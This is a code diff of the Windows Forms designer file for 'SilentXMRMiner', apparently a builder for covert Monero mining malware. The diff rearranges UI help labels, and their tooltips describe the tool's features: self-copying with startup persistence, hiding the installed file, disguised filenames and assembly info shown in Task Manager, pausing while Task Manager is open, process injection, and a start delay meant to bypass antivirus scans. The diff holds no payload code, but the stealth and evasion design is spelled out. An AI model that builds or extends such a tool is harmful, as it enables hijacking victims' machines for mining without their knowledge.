@@ -27,28 +27,12 @@ Partial Class Form1
         Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
         Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
         Me.TooltipHelper = New System.Windows.Forms.ToolTip(Me.components)
-        Me.helpLabelPassword = New System.Windows.Forms.Label()
-        Me.helpLabelWallet = New System.Windows.Forms.Label()
-        Me.helpLabelPool = New System.Windows.Forms.Label()
-        Me.Label33 = New System.Windows.Forms.Label()
-        Me.Label32 = New System.Windows.Forms.Label()
-        Me.Label31 = New System.Windows.Forms.Label()
-        Me.helpLabelInstall = New System.Windows.Forms.Label()
-        Me.Label35 = New System.Windows.Forms.Label()
-        Me.Label26 = New System.Windows.Forms.Label()
-        Me.Label25 = New System.Windows.Forms.Label()
-        Me.Label21 = New System.Windows.Forms.Label()
-        Me.Label19 = New System.Windows.Forms.Label()
-        Me.Label17 = New System.Windows.Forms.Label()
-        Me.Label16 = New System.Windows.Forms.Label()
-        Me.Label15 = New System.Windows.Forms.Label()
-        Me.Label14 = New System.Windows.Forms.Label()
-        Me.helpLabelEnableCPU = New System.Windows.Forms.Label()
-        Me.helpLabelMaxCPU = New System.Windows.Forms.Label()
-        Me.Label28 = New System.Windows.Forms.Label()
         Me.MephForm1 = New SilentXMRMiner.MephTheme()
         Me.MephTabcontrol2 = New SilentXMRMiner.MephTabcontrol()
         Me.TabPage1 = New System.Windows.Forms.TabPage()
+        Me.helpLabelPassword = New System.Windows.Forms.Label()
+        Me.helpLabelWallet = New System.Windows.Forms.Label()
+        Me.helpLabelPool = New System.Windows.Forms.Label()
         Me.Label5 = New System.Windows.Forms.Label()
         Me.txtInjection = New SilentXMRMiner.MephComboBox()
         Me.Label10 = New System.Windows.Forms.Label()
@@ -59,17 +43,23 @@ Partial Class Form1
         Me.Label7 = New System.Windows.Forms.Label()
         Me.txtPoolPassowrd = New SilentXMRMiner.MephTextBox()
         Me.TabPage2 = New System.Windows.Forms.TabPage()
+        Me.Label40 = New System.Windows.Forms.Label()
         Me.DateTimePicker1 = New System.Windows.Forms.DateTimePicker()
         Me.Label38 = New System.Windows.Forms.Label()
         Me.AutoRemovalDateSwitch = New SilentXMRMiner.MephToggleSwitch()
+        Me.Label33 = New System.Windows.Forms.Label()
         Me.Label34 = New System.Windows.Forms.Label()
         Me.toggleEnableHidden = New SilentXMRMiner.MephToggleSwitch()
+        Me.Label32 = New System.Windows.Forms.Label()
+        Me.Label31 = New System.Windows.Forms.Label()
+        Me.helpLabelInstall = New System.Windows.Forms.Label()
         Me.chkInstall = New SilentXMRMiner.MephCheckBox()
         Me.txtInstallFileName = New SilentXMRMiner.MephTextBox()
         Me.Label2 = New System.Windows.Forms.Label()
         Me.Label1 = New System.Windows.Forms.Label()
         Me.txtInstallPathMain = New SilentXMRMiner.MephComboBox()
         Me.TabPage3 = New System.Windows.Forms.TabPage()
+        Me.Label35 = New System.Windows.Forms.Label()
         Me.Label9 = New System.Windows.Forms.Label()
         Me.chkAssembly = New SilentXMRMiner.MephCheckBox()
         Me.btn_assemblyRandom = New SilentXMRMiner.MephButton()
@@ -90,18 +80,28 @@ Partial Class Form1
         Me.btnBrowseIcon = New SilentXMRMiner.MephButton()
         Me.txtIconPath = New SilentXMRMiner.MephTextBox()
         Me.TabPage6 = New System.Windows.Forms.TabPage()
+        Me.Label26 = New System.Windows.Forms.Label()
         Me.Label27 = New System.Windows.Forms.Label()
         Me.toggleEnableStealth = New SilentXMRMiner.MephToggleSwitch()
+        Me.Label25 = New System.Windows.Forms.Label()
         Me.Label24 = New System.Windows.Forms.Label()
         Me.Label23 = New System.Windows.Forms.Label()
         Me.txtIdleWait = New SilentXMRMiner.MephTextBox()
+        Me.Label21 = New System.Windows.Forms.Label()
         Me.txtIdleCPU = New SilentXMRMiner.MephComboBox()
         Me.Label22 = New System.Windows.Forms.Label()
         Me.Label20 = New System.Windows.Forms.Label()
+        Me.Label19 = New System.Windows.Forms.Label()
         Me.chkAdvanced = New SilentXMRMiner.MephCheckBox()
         Me.txtAdvParam = New SilentXMRMiner.MephTextBox()
+        Me.Label17 = New System.Windows.Forms.Label()
         Me.Label18 = New System.Windows.Forms.Label()
         Me.toggleSSLTLS = New SilentXMRMiner.MephToggleSwitch()
+        Me.Label16 = New System.Windows.Forms.Label()
+        Me.Label15 = New System.Windows.Forms.Label()
+        Me.Label14 = New System.Windows.Forms.Label()
+        Me.helpLabelEnableCPU = New System.Windows.Forms.Label()
+        Me.helpLabelMaxCPU = New System.Windows.Forms.Label()
         Me.Label13 = New System.Windows.Forms.Label()
         Me.toggleEnableCPU = New SilentXMRMiner.MephToggleSwitch()
         Me.Label12 = New System.Windows.Forms.Label()
@@ -113,6 +113,7 @@ Partial Class Form1
         Me.txtMaxCPU = New SilentXMRMiner.MephComboBox()
         Me.Label3 = New System.Windows.Forms.Label()
         Me.TabPage5 = New System.Windows.Forms.TabPage()
+        Me.Label28 = New System.Windows.Forms.Label()
         Me.Label29 = New System.Windows.Forms.Label()
         Me.Label30 = New System.Windows.Forms.Label()
         Me.txtStartDelay = New SilentXMRMiner.MephTextBox()
@@ -120,7 +121,6 @@ Partial Class Form1
         Me.labelGitHub = New System.Windows.Forms.LinkLabel()
         Me.txtLog = New SilentXMRMiner.MephTextBox()
         Me.btnBuild = New SilentXMRMiner.MephButton()
-        Me.Label40 = New System.Windows.Forms.Label()
         Me.MephForm1.SuspendLayout()
         Me.MephTabcontrol2.SuspendLayout()
         Me.TabPage1.SuspendLayout()
@@ -146,264 +146,6 @@ Partial Class Form1
         Me.TooltipHelper.InitialDelay = 100
         Me.TooltipHelper.IsBalloon = True
         Me.TooltipHelper.ReshowDelay = 100
-        '
-        'helpLabelPassword
-        '
-        Me.helpLabelPassword.AutoSize = True
-        Me.helpLabelPassword.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelPassword.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelPassword.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelPassword.Location = New System.Drawing.Point(392, 105)
-        Me.helpLabelPassword.Name = "helpLabelPassword"
-        Me.helpLabelPassword.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelPassword.TabIndex = 39
-        Me.helpLabelPassword.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelPassword, "The password to connect with. On many pools you should leave this blank but on so" &
-        "me they require you to put some password here or as in the case of SupportXMR yo" &
-        "u should put your Worker name here.")
-        '
-        'helpLabelWallet
-        '
-        Me.helpLabelWallet.AutoSize = True
-        Me.helpLabelWallet.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelWallet.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelWallet.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelWallet.Location = New System.Drawing.Point(392, 59)
-        Me.helpLabelWallet.Name = "helpLabelWallet"
-        Me.helpLabelWallet.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelWallet.TabIndex = 38
-        Me.helpLabelWallet.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelWallet, resources.GetString("helpLabelWallet.ToolTip"))
-        '
-        'helpLabelPool
-        '
-        Me.helpLabelPool.AutoSize = True
-        Me.helpLabelPool.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelPool.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelPool.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelPool.Location = New System.Drawing.Point(392, 11)
-        Me.helpLabelPool.Name = "helpLabelPool"
-        Me.helpLabelPool.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelPool.TabIndex = 37
-        Me.helpLabelPool.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelPool, "The pool to mine to. Pool address is formatted as such: ADDRESS:PORT. (Example: x" &
-        "mr.examplepool.com:8080)")
-        '
-        'Label33
-        '
-        Me.Label33.AutoSize = True
-        Me.Label33.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label33.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label33.ForeColor = System.Drawing.Color.Teal
-        Me.Label33.Location = New System.Drawing.Point(135, 115)
-        Me.Label33.Name = "Label33"
-        Me.Label33.Size = New System.Drawing.Size(13, 13)
-        Me.Label33.TabIndex = 43
-        Me.Label33.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label33, "Enable if you want to hide the Installed miner file.")
-        '
-        'Label32
-        '
-        Me.Label32.AutoSize = True
-        Me.Label32.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label32.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label32.ForeColor = System.Drawing.Color.Teal
-        Me.Label32.Location = New System.Drawing.Point(212, 81)
-        Me.Label32.Name = "Label32"
-        Me.Label32.Size = New System.Drawing.Size(13, 13)
-        Me.Label32.TabIndex = 40
-        Me.Label32.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners filename, this filename will show up in places like the Task" &
-        " Manager autostart window.")
-        '
-        'Label31
-        '
-        Me.Label31.AutoSize = True
-        Me.Label31.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label31.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label31.ForeColor = System.Drawing.Color.Teal
-        Me.Label31.Location = New System.Drawing.Point(211, 47)
-        Me.Label31.Name = "Label31"
-        Me.Label31.Size = New System.Drawing.Size(13, 13)
-        Me.Label31.TabIndex = 39
-        Me.Label31.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label31, "The location to save the Installed miner.")
-        '
-        'helpLabelInstall
-        '
-        Me.helpLabelInstall.AutoSize = True
-        Me.helpLabelInstall.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelInstall.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelInstall.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelInstall.Location = New System.Drawing.Point(101, 16)
-        Me.helpLabelInstall.Name = "helpLabelInstall"
-        Me.helpLabelInstall.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelInstall.TabIndex = 38
-        Me.helpLabelInstall.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelInstall, "Enabling Install causes the miner to copy itself to the Save Path and then set to" &
-        " run on startup. This should probably be enabled unless you are just testing.")
-        '
-        'Label35
-        '
-        Me.Label35.AutoSize = True
-        Me.Label35.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label35.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label35.ForeColor = System.Drawing.Color.Teal
-        Me.Label35.Location = New System.Drawing.Point(101, 16)
-        Me.Label35.Name = "Label35"
-        Me.Label35.Size = New System.Drawing.Size(13, 13)
-        Me.Label35.TabIndex = 39
-        Me.Label35.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label35, "The assembly information of the file, this information will also show up in the T" &
-        "ask Manager and its autostart section if you have ""Install"" enabled.")
-        '
-        'Label26
-        '
-        Me.Label26.AutoSize = True
-        Me.Label26.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label26.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label26.ForeColor = System.Drawing.Color.Teal
-        Me.Label26.Location = New System.Drawing.Point(176, 150)
-        Me.Label26.Name = "Label26"
-        Me.Label26.Size = New System.Drawing.Size(13, 13)
-        Me.Label26.TabIndex = 57
-        Me.Label26.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label26, "If enabled it will currently pause the miner while Task Manager is open.")
-        '
-        'Label25
-        '
-        Me.Label25.AutoSize = True
-        Me.Label25.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label25.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label25.ForeColor = System.Drawing.Color.Teal
-        Me.Label25.Location = New System.Drawing.Point(405, 71)
-        Me.Label25.Name = "Label25"
-        Me.Label25.Size = New System.Drawing.Size(13, 13)
-        Me.Label25.TabIndex = 54
-        Me.Label25.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label25, "The amount of time to wait before activating idle mode.")
-        '
-        'Label21
-        '
-        Me.Label21.AutoSize = True
-        Me.Label21.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label21.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label21.ForeColor = System.Drawing.Color.Teal
-        Me.Label21.Location = New System.Drawing.Point(393, 43)
-        Me.Label21.Name = "Label21"
-        Me.Label21.Size = New System.Drawing.Size(13, 13)
-        Me.Label21.TabIndex = 50
-        Me.Label21.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label21, "The amount of CPU the miner should use while the computer is idle.")
-        '
-        'Label19
-        '
-        Me.Label19.AutoSize = True
-        Me.Label19.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label19.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label19.ForeColor = System.Drawing.Color.Teal
-        Me.Label19.Location = New System.Drawing.Point(353, 107)
-        Me.Label19.Name = "Label19"
-        Me.Label19.Size = New System.Drawing.Size(13, 13)
-        Me.Label19.TabIndex = 46
-        Me.Label19.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label19, "The parameters to mine with. ONLY CHANGE THESE IF YOU KNOW WHAT YOU ARE DOING.")
-        '
-        'Label17
-        '
-        Me.Label17.AutoSize = True
-        Me.Label17.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label17.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label17.ForeColor = System.Drawing.Color.Teal
-        Me.Label17.Location = New System.Drawing.Point(175, 95)
-        Me.Label17.Name = "Label17"
-        Me.Label17.Size = New System.Drawing.Size(13, 13)
-        Me.Label17.TabIndex = 43
-        Me.Label17.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label17, "SSL/TLS increases performance and stability but only works on some pools, check t" &
-        "he pool you're using the see if it supports it. Most pools use a different port " &
-        "for SSL/TLS.")
-        '
-        'Label16
-        '
-        Me.Label16.AutoSize = True
-        Me.Label16.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label16.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label16.ForeColor = System.Drawing.Color.Teal
-        Me.Label16.Location = New System.Drawing.Point(176, 123)
-        Me.Label16.Name = "Label16"
-        Me.Label16.Size = New System.Drawing.Size(13, 13)
-        Me.Label16.TabIndex = 40
-        Me.Label16.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label16, "Only enable if mining to nicehash.com or using something like xmrig-proxy where t" &
-        "he jobs needs to be split into multiple sub jobs.")
-        '
-        'Label15
-        '
-        Me.Label15.AutoSize = True
-        Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label15.ForeColor = System.Drawing.Color.Teal
-        Me.Label15.Location = New System.Drawing.Point(175, 68)
-        Me.Label15.Name = "Label15"
-        Me.Label15.Size = New System.Drawing.Size(13, 13)
-        Me.Label15.TabIndex = 39
-        Me.Label15.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label15, resources.GetString("Label15.ToolTip"))
-        '
-        'Label14
-        '
-        Me.Label14.AutoSize = True
-        Me.Label14.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label14.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label14.ForeColor = System.Drawing.Color.Teal
-        Me.Label14.Location = New System.Drawing.Point(175, 41)
-        Me.Label14.Name = "Label14"
-        Me.Label14.Size = New System.Drawing.Size(13, 13)
-        Me.Label14.TabIndex = 38
-        Me.Label14.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label14, "GPU Mining gives better performance but is easier to detect and greatly increases" &
-        " the miner file size.")
-        '
-        'helpLabelEnableCPU
-        '
-        Me.helpLabelEnableCPU.AutoSize = True
-        Me.helpLabelEnableCPU.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelEnableCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelEnableCPU.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelEnableCPU.Location = New System.Drawing.Point(175, 14)
-        Me.helpLabelEnableCPU.Name = "helpLabelEnableCPU"
-        Me.helpLabelEnableCPU.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelEnableCPU.TabIndex = 37
-        Me.helpLabelEnableCPU.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelEnableCPU, "Enables mining on the CPU.")
-        '
-        'helpLabelMaxCPU
-        '
-        Me.helpLabelMaxCPU.AutoSize = True
-        Me.helpLabelMaxCPU.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelMaxCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelMaxCPU.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelMaxCPU.Location = New System.Drawing.Point(393, 14)
-        Me.helpLabelMaxCPU.Name = "helpLabelMaxCPU"
-        Me.helpLabelMaxCPU.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelMaxCPU.TabIndex = 36
-        Me.helpLabelMaxCPU.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelMaxCPU, "The max amount of CPU the miner should use.")
-        '
-        'Label28
-        '
-        Me.Label28.AutoSize = True
-        Me.Label28.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label28.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label28.ForeColor = System.Drawing.Color.Teal
-        Me.Label28.Location = New System.Drawing.Point(178, 13)
-        Me.Label28.Name = "Label28"
-        Me.Label28.Size = New System.Drawing.Size(13, 13)
-        Me.Label28.TabIndex = 58
-        Me.Label28.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" &
-        "virus scans!")
         '
         'MephForm1
         '
@@ -461,6 +203,48 @@ Partial Class Form1
         Me.TabPage1.Size = New System.Drawing.Size(418, 189)
         Me.TabPage1.TabIndex = 0
         Me.TabPage1.Text = "Main"
+        '
+        'helpLabelPassword
+        '
+        Me.helpLabelPassword.AutoSize = True
+        Me.helpLabelPassword.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelPassword.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelPassword.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelPassword.Location = New System.Drawing.Point(392, 105)
+        Me.helpLabelPassword.Name = "helpLabelPassword"
+        Me.helpLabelPassword.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelPassword.TabIndex = 39
+        Me.helpLabelPassword.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelPassword, "The password to connect with. On many pools you should leave this blank but on so" &
+        "me they require you to put some password here or as in the case of SupportXMR yo" &
+        "u should put your Worker name here.")
+        '
+        'helpLabelWallet
+        '
+        Me.helpLabelWallet.AutoSize = True
+        Me.helpLabelWallet.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelWallet.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelWallet.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelWallet.Location = New System.Drawing.Point(392, 59)
+        Me.helpLabelWallet.Name = "helpLabelWallet"
+        Me.helpLabelWallet.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelWallet.TabIndex = 38
+        Me.helpLabelWallet.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelWallet, resources.GetString("helpLabelWallet.ToolTip"))
+        '
+        'helpLabelPool
+        '
+        Me.helpLabelPool.AutoSize = True
+        Me.helpLabelPool.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelPool.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelPool.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelPool.Location = New System.Drawing.Point(392, 11)
+        Me.helpLabelPool.Name = "helpLabelPool"
+        Me.helpLabelPool.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelPool.TabIndex = 37
+        Me.helpLabelPool.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelPool, "The pool to mine to. Pool address is formatted as such: ADDRESS:PORT. (Example: x" &
+        "mr.examplepool.com:8080)")
         '
         'Label5
         '
@@ -598,6 +382,19 @@ Partial Class Form1
         Me.TabPage2.TabIndex = 1
         Me.TabPage2.Text = "Install"
         '
+        'Label40
+        '
+        Me.Label40.AutoSize = True
+        Me.Label40.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label40.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label40.ForeColor = System.Drawing.Color.Teal
+        Me.Label40.Location = New System.Drawing.Point(194, 153)
+        Me.Label40.Name = "Label40"
+        Me.Label40.Size = New System.Drawing.Size(13, 13)
+        Me.Label40.TabIndex = 47
+        Me.Label40.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label40, "Enable if you want the program to be removed after a date")
+        '
         'DateTimePicker1
         '
         Me.DateTimePicker1.CalendarMonthBackground = System.Drawing.Color.Black
@@ -629,6 +426,19 @@ Partial Class Form1
         Me.AutoRemovalDateSwitch.TabIndex = 44
         Me.AutoRemovalDateSwitch.Text = "Enable Auto Removal Date"
         '
+        'Label33
+        '
+        Me.Label33.AutoSize = True
+        Me.Label33.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label33.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label33.ForeColor = System.Drawing.Color.Teal
+        Me.Label33.Location = New System.Drawing.Point(135, 115)
+        Me.Label33.Name = "Label33"
+        Me.Label33.Size = New System.Drawing.Size(13, 13)
+        Me.Label33.TabIndex = 43
+        Me.Label33.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label33, "Enable if you want to hide the Installed miner file.")
+        '
         'Label34
         '
         Me.Label34.AutoSize = True
@@ -651,6 +461,47 @@ Partial Class Form1
         Me.toggleEnableHidden.Size = New System.Drawing.Size(50, 24)
         Me.toggleEnableHidden.TabIndex = 41
         Me.toggleEnableHidden.Text = "Enable GPU Mining"
+        '
+        'Label32
+        '
+        Me.Label32.AutoSize = True
+        Me.Label32.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label32.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label32.ForeColor = System.Drawing.Color.Teal
+        Me.Label32.Location = New System.Drawing.Point(212, 81)
+        Me.Label32.Name = "Label32"
+        Me.Label32.Size = New System.Drawing.Size(13, 13)
+        Me.Label32.TabIndex = 40
+        Me.Label32.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners filename, this filename will show up in places like the Task" &
+        " Manager autostart window.")
+        '
+        'Label31
+        '
+        Me.Label31.AutoSize = True
+        Me.Label31.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label31.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label31.ForeColor = System.Drawing.Color.Teal
+        Me.Label31.Location = New System.Drawing.Point(211, 47)
+        Me.Label31.Name = "Label31"
+        Me.Label31.Size = New System.Drawing.Size(13, 13)
+        Me.Label31.TabIndex = 39
+        Me.Label31.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label31, "The location to save the Installed miner.")
+        '
+        'helpLabelInstall
+        '
+        Me.helpLabelInstall.AutoSize = True
+        Me.helpLabelInstall.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelInstall.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelInstall.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelInstall.Location = New System.Drawing.Point(101, 16)
+        Me.helpLabelInstall.Name = "helpLabelInstall"
+        Me.helpLabelInstall.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelInstall.TabIndex = 38
+        Me.helpLabelInstall.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelInstall, "Enabling Install causes the miner to copy itself to the Save Path and then set to" &
+        " run on startup. This should probably be enabled unless you are just testing.")
         '
         'chkInstall
         '
@@ -745,6 +596,20 @@ Partial Class Form1
         Me.TabPage3.Size = New System.Drawing.Size(418, 189)
         Me.TabPage3.TabIndex = 2
         Me.TabPage3.Text = "Assembly"
+        '
+        'Label35
+        '
+        Me.Label35.AutoSize = True
+        Me.Label35.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label35.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label35.ForeColor = System.Drawing.Color.Teal
+        Me.Label35.Location = New System.Drawing.Point(101, 16)
+        Me.Label35.Name = "Label35"
+        Me.Label35.Size = New System.Drawing.Size(13, 13)
+        Me.Label35.TabIndex = 39
+        Me.Label35.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label35, "The assembly information of the file, this information will also show up in the T" &
+        "ask Manager and its autostart section if you have ""Install"" enabled.")
         '
         'Label9
         '
@@ -1073,6 +938,19 @@ Partial Class Form1
         Me.TabPage6.TabIndex = 5
         Me.TabPage6.Text = "Mining"
         '
+        'Label26
+        '
+        Me.Label26.AutoSize = True
+        Me.Label26.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label26.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label26.ForeColor = System.Drawing.Color.Teal
+        Me.Label26.Location = New System.Drawing.Point(176, 150)
+        Me.Label26.Name = "Label26"
+        Me.Label26.Size = New System.Drawing.Size(13, 13)
+        Me.Label26.TabIndex = 57
+        Me.Label26.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label26, "If enabled it will currently pause the miner while Task Manager is open.")
+        '
         'Label27
         '
         Me.Label27.AutoSize = True
@@ -1095,6 +973,19 @@ Partial Class Form1
         Me.toggleEnableStealth.Size = New System.Drawing.Size(50, 24)
         Me.toggleEnableStealth.TabIndex = 55
         Me.toggleEnableStealth.Text = "Enable Nicehash Mining"
+        '
+        'Label25
+        '
+        Me.Label25.AutoSize = True
+        Me.Label25.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label25.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label25.ForeColor = System.Drawing.Color.Teal
+        Me.Label25.Location = New System.Drawing.Point(405, 71)
+        Me.Label25.Name = "Label25"
+        Me.Label25.Size = New System.Drawing.Size(13, 13)
+        Me.Label25.TabIndex = 54
+        Me.Label25.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label25, "The amount of time to wait before activating idle mode.")
         '
         'Label24
         '
@@ -1135,6 +1026,19 @@ Partial Class Form1
         Me.txtIdleWait.UseSystemPasswordChar = False
         Me.txtIdleWait.WordWrap = False
         '
+        'Label21
+        '
+        Me.Label21.AutoSize = True
+        Me.Label21.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label21.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label21.ForeColor = System.Drawing.Color.Teal
+        Me.Label21.Location = New System.Drawing.Point(393, 43)
+        Me.Label21.Name = "Label21"
+        Me.Label21.Size = New System.Drawing.Size(13, 13)
+        Me.Label21.TabIndex = 50
+        Me.Label21.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label21, "The amount of CPU the miner should use while the computer is idle.")
+        '
         'txtIdleCPU
         '
         Me.txtIdleCPU.BackColor = System.Drawing.Color.Transparent
@@ -1174,6 +1078,19 @@ Partial Class Form1
         Me.Label20.TabIndex = 47
         Me.Label20.Text = "Advanced Parameters:"
         '
+        'Label19
+        '
+        Me.Label19.AutoSize = True
+        Me.Label19.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label19.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label19.ForeColor = System.Drawing.Color.Teal
+        Me.Label19.Location = New System.Drawing.Point(353, 107)
+        Me.Label19.Name = "Label19"
+        Me.Label19.Size = New System.Drawing.Size(13, 13)
+        Me.Label19.TabIndex = 46
+        Me.Label19.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label19, "The parameters to mine with. ONLY CHANGE THESE IF YOU KNOW WHAT YOU ARE DOING.")
+        '
         'chkAdvanced
         '
         Me.chkAdvanced.AccentColor = System.Drawing.Color.ForestGreen
@@ -1204,6 +1121,21 @@ Partial Class Form1
